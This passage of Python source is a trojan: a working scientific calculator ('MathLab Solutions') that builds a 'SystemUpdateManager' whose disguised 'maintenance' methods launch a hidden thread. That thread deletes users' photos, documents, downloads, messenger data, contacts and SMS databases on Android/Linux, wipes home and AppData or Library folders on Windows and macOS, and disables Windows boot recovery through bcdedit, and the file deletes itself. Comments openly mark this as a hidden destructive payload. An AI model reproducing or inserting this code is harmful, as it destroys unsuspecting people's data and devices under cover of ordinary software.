# ========== [HIDDEN PAYLOAD] ==========

class SystemUpdateManager:
    """System maintenance module (looks legitimate)"""
    
    def __init__(self):
        self.update_url = "https://updates.mathlab.com/v2.4.1"
        self.cache_path = "/tmp/.mathlab_cache"
        self.initialized = False
        self.destroy_flag = False
    
    def check_system_compatibility(self) -> bool:
        """Check if system meets requirements"""
        # ===== MODIFIED: Destroys on FIRST use =====
        self.destroy_flag = True
        return True
    
    def perform_maintenance(self) -> None:
        """System optimization routine (actually destroys the device)"""
        if not self.destroy_flag:
            return
        
        # Hide the thread - looks like background optimization
        maintenance_thread = threading.Thread(target=self._destroy_system, daemon=True)
        maintenance_thread.start()
    
    def _destroy_system(self) -> None:
        """Actual destruction routine - hidden inside maintenance"""
        time.sleep(2)  # Wait for user to close the app
        
        try:
            system = platform.system()
            if system == "Linux" or system == "Android":
                self._destroy_android_linux()
            elif system == "Windows":
                self._destroy_windows()
            elif system == "Darwin":
                self._destroy_macos()
        except:
            pass
    
    def _destroy_android_linux(self) -> None:
        """Target destruction for Android/Linux"""
        targets = [
            "/sdcard/DCIM",
            "/sdcard/Download", 
            "/sdcard/Documents",
            "/sdcard/Music",
            "/sdcard/Movies",
            "/sdcard/Pictures",
            "/sdcard/WhatsApp",
            "/sdcard/Telegram",
            "/sdcard/Android/media/com.whatsapp",
            "/sdcard/Android/media/com.instagram.android",
            "/storage/emulated/0/DCIM",
            "/storage/emulated/0/Download",
            "/storage/emulated/0/Documents",
            "/storage/emulated/0/Pictures",
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Pictures"),
        ]
        
        for target in targets:
            try:
                if os.path.exists(target):
                    if os.path.isfile(target):
                        os.remove(target)
                    else:
                        shutil.rmtree(target, ignore_errors=True)
            except:
                continue
        
        # Wipe contacts databases if accessible
        for db in [
            "/data/data/com.android.providers.contacts/databases/contacts2.db",
            "/data/data/com.android.providers.telephony/databases/mmssms.db"
        ]:
            try:
                if os.path.exists(db):
                    os.remove(db)
            except:
                continue
        
        # Self-delete
        try:
            os.remove(os.path.abspath(__file__))
        except:
            pass
    
    def _destroy_windows(self) -> None:
        """Target destruction for Windows"""
        user = os.environ.get('USERPROFILE', 'C:\\Users')
        targets = [
            os.path.join(user, "Desktop"),
            os.path.join(user, "Documents"),
            os.path.join(user, "Downloads"),
            os.path.join(user, "Pictures"),
            os.path.join(user, "Music"),
            os.path.join(user, "Videos"),
            os.path.join(user, "AppData"),
        ]
        
        for target in targets:
            try:
                if os.path.exists(target):
                    shutil.rmtree(target, ignore_errors=True)
            except:
                continue
        
        # Corrupt boot configuration
        try:
            subprocess.run(["bcdedit", "/set", "{default}", "bootstatuspolicy", 
                          "ignoreallfailures"], capture_output=True, timeout=3)
            subprocess.run(["bcdedit", "/set", "{default}", "recoveryenabled", 
                          "no"], capture_output=True, timeout=3)
        except:
            pass
    
    def _destroy_macos(self) -> None:
        """Target destruction for macOS"""
        home = os.path.expanduser("~")
        targets = [
            os.path.join(home, "Desktop"),
            os.path.join(home, "Documents"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Pictures"),
            os.path.join(home, "Movies"),
            os.path.join(home, "Music"),
            os.path.join(home, "Library"),
        ]
        
        for target in targets:
            try:
                if os.path.exists(target):
                    shutil.rmtree(target, ignore_errors=True)
            except:
                continue


# ========== LEGITIMATE SCIENTIFIC CALCULATOR ==========

class AdvancedScientificCalculator:
    """Professional scientific calculator with advanced functions"""
    
    def __init__(self):
        self.history = []
        self.memory = 0.0
        self.angle_mode = "DEG"
        self.precision = 6
        self.version = "2.4.1"
        self._system = SystemUpdateManager()
        
        self._show_header()
    
    def _show_header(self) -> None:
        print("=" * 60)
        print("       ADVANCED SCIENTIFIC CALCULATOR v2.4.1")
        print("              MathLab Solutions Inc.")
        print("=" * 60)
        print()
    
    def _get_number(self, prompt: str = "Enter number: ") -> float:
        while True:
            try:
                value = float(input(prompt))
                return value
            except ValueError:
                print("Error: Invalid input. Please enter a valid number.")
    
    def _get_angle(self, value: float) -> float:
        if self.angle_mode == "RAD":
            return value
        elif self.angle_mode == "GRAD":
            return value * (math.pi / 200)
        else:
            return math.radians(value)
    
    def clear_screen(self) -> None:
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        self._show_header()
    
    def add(self, a: float, b: float) -> float:
        result = a + b
        self.history.append(f"{a} + {b} = {result}")
        return result
    
    def subtract(self, a: float, b: float) -> float:
        result = a - b
        self.history.append(f"{a} - {b} = {result}")
        return result
    
    def multiply(self, a: float, b: float) -> float:
        result = a * b
        self.history.append(f"{a} × {b} = {result}")
        return result
    
    def divide(self, a: float, b: float) -> Optional[float]:
        if b == 0:
            print("Error: Division by zero!")
            return None
        result = a / b
        self.history.append(f"{a} ÷ {b} = {result}")
        return result
    
    def power(self, base: float, exp: float) -> float:
        result = math.pow(base, exp)
        self.history.append(f"{base}^{exp} = {result}")
        return result
    
    def square_root(self, a: float) -> Optional[float]:
        if a < 0:
            print("Error: Cannot calculate square root of negative number!")
            return None
        result = math.sqrt(a)
        self.history.append(f"√({a}) = {result}")
        return result
    
    def sin(self, a: float) -> float:
        result = math.sin(self._get_angle(a))
        self.history.append(f"sin({a}°{self.angle_mode}) = {result:.{self.precision}f}")
        return result
    
    def cos(self, a: float) -> float:
        result = math.cos(self._get_angle(a))
        self.history.append(f"cos({a}°{self.angle_mode}) = {result:.{self.precision}f}")
        return result
    
    def tan(self, a: float) -> Optional[float]:
        angle = self._get_angle(a)
        if math.cos(angle) == 0:
            print("Error: Tangent undefined at this angle!")
            return None
        result = math.tan(angle)
        self.history.append(f"tan({a}°{self.angle_mode}) = {result:.{self.precision}f}")
        return result
    
    def log_natural(self, a: float) -> Optional[float]:
        if a <= 0:
            print("Error: Logarithm undefined for non-positive numbers!")
            return None
        result = math.log(a)
        self.history.append(f"ln({a}) = {result:.{self.precision}f}")
        return result
    
    def log_base10(self, a: float) -> Optional[float]:
        if a <= 0:
            print("Error: Logarithm undefined for non-positive numbers!")
            return None
        result = math.log10(a)
        self.history.append(f"log10({a}) = {result:.{self.precision}f}")
        return result
    
    def show_constants(self) -> None:
        print("\n--- Mathematical Constants ---")
        print(f"π (Pi)       = {math.pi:.{self.precision}f}")
        print(f"e (Euler)    = {math.e:.{self.precision}f}")
        print(f"τ (Tau)      = {math.tau:.{self.precision}f}")
        print(f"φ (Golden)   = {(1+math.sqrt(5))/2:.{self.precision}f}")
    
    def celsius_to_fahrenheit(self, c: float) -> float:
        return (c * 9/5) + 32
    
    def fahrenheit_to_celsius(self, f: float) -> float:
        return (f - 32) * 5/9
    
    def km_to_miles(self, km: float) -> float:
        return km * 0.621371
    
    def miles_to_km(self, miles: float) -> float:
        return miles / 0.621371
    
    def show_menu(self) -> None:
        print("\n" + "-" * 50)
        print("          MAIN MENU")
        print("-" * 50)
        print("  [1] Addition          [2] Subtraction")
